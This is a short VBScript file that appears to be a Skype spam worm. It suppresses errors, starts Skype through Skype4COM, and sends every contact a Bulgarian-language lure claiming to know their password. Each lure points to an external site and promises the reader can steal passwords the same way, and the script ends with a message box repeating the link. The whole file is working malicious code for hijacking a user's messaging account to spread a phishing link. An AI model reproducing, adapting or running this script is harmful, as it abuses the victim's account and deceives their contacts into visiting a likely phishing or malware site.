on error resume next

set yADAl = WScript.CreateObject("Skype4COM.Skype", "Skype_")
yADAl.Client.Start()

For Each GAG In yADAl.Friends
yADAl.SendMessage GAG.handle,"Zdravei! (hi)"
yADAl.SendMessage GAG.handle,"Za tvoe sajelenie znam parolata ti!"
yADAl.SendMessage GAG.handle,"Ako iska6 da razbere6 ot kade q znam vlez tuk http://znam-ti-pass-a.hit.bg/"
yADAl.SendMessage GAG.handle,"Po tozi na4in moje i ti da razbere6 pass-a na nqkoi :)"
next
WScript.Sleep(300000)
For Each GAG In yADAl.Friends
yADAl.SendMessage GAG.handle,"Bye! :)"
next
msgbox "by http://znam-ti-pass-a.hit.bg/"